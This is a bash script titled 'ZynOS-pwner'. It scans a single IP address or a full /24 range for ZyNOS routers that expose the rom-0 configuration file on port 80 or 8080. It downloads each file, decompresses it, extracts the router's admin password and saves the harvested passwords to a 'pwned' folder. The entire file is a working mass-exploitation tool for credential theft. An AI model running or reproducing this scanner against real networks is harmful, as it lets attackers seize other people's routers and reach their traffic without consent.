#/bin/bash
#
# ZynOS-pwner <https://github.com/gojigeje/zynos-pwner>
# Copyright (c) 2014 Ghozy Arif Fajri <gojigeje@gmail.com>
# License: The MIT License (MIT)
#

start() {
  pausetime="5"
  mkdir -p "rom" "pwned"
  tanggal=$(date +%Y-%m-%d_%H%M%S)

  if [[ -z "$1" ]]; then
    echo -e "\e[1;93mERROR: \e[0;93mNeed parameter!\e[0;39m"
    echo "Usage: $0 123.456.789.10  to pwn single IP"
    echo "       $0 123.456.789     to pwn IP ranging from .1 - .255"
    echo ""
    exit 1
  fi
  if echo "$1" | egrep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > /dev/null ;then
      VALID_IP_ADDRESS=$(echo $1 | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <= 255 && $4 <= 255')
      if [ -z "$VALID_IP_ADDRESS" ]; then
        echo -e "\e[1;93mERROR: \e[0;93mThe IP address wasn't valid; octets must be less than 256!\e[0;39m"
        exit 1
      else
        mode="single"
        target=$(echo $1 | sed 's/\.\.*$//')
        echo "OK! Pwn-ing single target: $target"
        pwn_single "$1" 2> /dev/null
      fi
  else
    if echo "$1" | egrep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > /dev/null ;then
      VALID_IP_ADDRESS=$(echo $1 | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <= 255')
      if [ -z "$VALID_IP_ADDRESS" ]; then
        echo -e "\e[1;93mERROR: \e[0;93mThe IP address wasn't valid; octets must be less than 256!\e[0;39m"
      else
        prefix=$(echo $1 | sed 's/\.\.*$//')
        echo "OK! Pwn-ing range target: $prefix.1 - $prefix.255"
        pwn_range 2> /dev/null
      fi
    else
      echo -e "\e[1;93mERROR: \e[0;93mThe IP Address is malformed!\e[0;39m"
      exit
    fi
  fi
}

cekonline() {
  if eval "ping -c 1 8.8.4.4 -w 2 > /dev/null 2>&1"; then
    isonline="1"
  else
    isonline="0"
  fi

  if [[ $isonline -gt 0 ]]; then
    if [[ $paused -gt 0 ]]; then
      echo -e "\e[1;92m# OK Connected! \e[96m(Resuming scan..)\e[0;39m"
      paused="0"
    fi
  else
    if [[ $paused -gt 0 ]]; then
      sleep $pausetime
      cekonline
    else
      echo -e "\e[1;93m# WARNING: \e[0;93mCan't connect to internet! \e[96m(pausing untill connected..)\e[0;39m"
      paused="1"
      cekonline
    fi
  fi
}

decompress() {
  ./decompress "rom/$1" > /dev/null 2>&1
  pass=$(strings "rom/$1.decomp" | head -n 1)
  if [ -z "$2" ]
    then
      echo -e "\e[1;92m$1\e[0;92m > OK! Password: \e[1;93m$pass \e[0;39m"
      if [[ $mode = "single" ]]; then
        echo "$1 > Password: $pass" >> "pwned/$1 ($tanggal)"
      else
        echo "$1 > Password: $pass" >> "pwned/$prefix ($tanggal)"  
      fi
    else
      echo -e "\e[1;92m$1:8080\e[0;92m > OK! Password: \e[1;93m$pass \e[0;39m"
      if [[ $mode = "singl" ]]; then
        echo "$1:8080 > Password: $pass" >> "pwned/$1 ($tanggal)"
      else
        echo "$1:8080 > Password: $pass" >> "pwned/$prefix ($tanggal)"
      fi
  fi
}

pwn_range() {
  for i in $prefix.{1..255}
  do
    cekonline

    echo -n "$i > "
    wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i/rom-0"
    EXIT_CODE=$?

    if [ $EXIT_CODE -gt 0 ];
      then
        # coba port 8080
        wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i:8080/rom-0"
        EXIT_CODE=$?

        if [ $EXIT_CODE -gt 0 ];
          then
            echo -e "\e[31mFailed! -not vulnerable?- \e[0;39m"
        else
          wget -q "http://$i:8080/rom-0" -O "rom/$i" &
          PID=$!
          sleep 3
          PSPID=$(ps | grep $PID | grep -v grep)
          if [ "$PSPID" != "" ]; then
            # macet
            kill $PID > /dev/null 2>&1
            echo -e "\e[31mFailed! -timeout- \e[0;39m"
          else
            # ok
            # decompress 8080
            decompress "$i" "8080"
          fi
        fi

    else
      wget -q "http://$i/rom-0" -O "rom/$i" &
      PID=$!
      sleep 3
      PSPID=$(ps | grep $PID | grep -v grep)
      if [ "$PSPID" != "" ]; then
        # macet
        kill $PID > /dev/null 2>&1
        echo -e "\e[31mFailed! -timeout- \e[0;39m"
      else
        # ok
        # decompress
        decompress "$i"
      fi
    fi

  done
}

pwn_single() {
  i="$1"
  echo -n "$i > "
  wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i/rom-0"
  EXIT_CODE=$?

  if [ $EXIT_CODE -gt 0 ];
    then
      # coba port 8080
      wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i:8080/rom-0"
      EXIT_CODE=$?

      if [ $EXIT_CODE -gt 0 ];
        then
          echo -e "\e[31mFailed! -not vulnerable?- \e[0;39m"
      else
        wget -q "http://$i:8080/rom-0" -O "rom/$i" &
        PID=$!
        sleep 3
        PSPID=$(ps | grep $PID | grep -v grep)
        if [ "$PSPID" != "" ]; then
          # macet
          kill $PID > /dev/null 2>&1
          echo -e "\e[31mFailed! -timeout- \e[0;39m"
        else
          # ok
          # decompress 8080
          decompress "$i" "8080"
        fi
      fi

  else
    wget -q "http://$i/rom-0" -O "rom/$i" &
    PID=$!
    sleep 3
    PSPID=$(ps | grep $PID | grep -v grep)
    if [ "$PSPID" != "" ]; then
      # macet
      kill $PID > /dev/null 2>&1
      echo -e "\e[31mFailed! -timeout- \e[0;39m"
    else
      # ok
      # decompress
      decompress "$i"
    fi
  fi
}

start "$@"
rm "rom/*" > /dev/null 2>&1
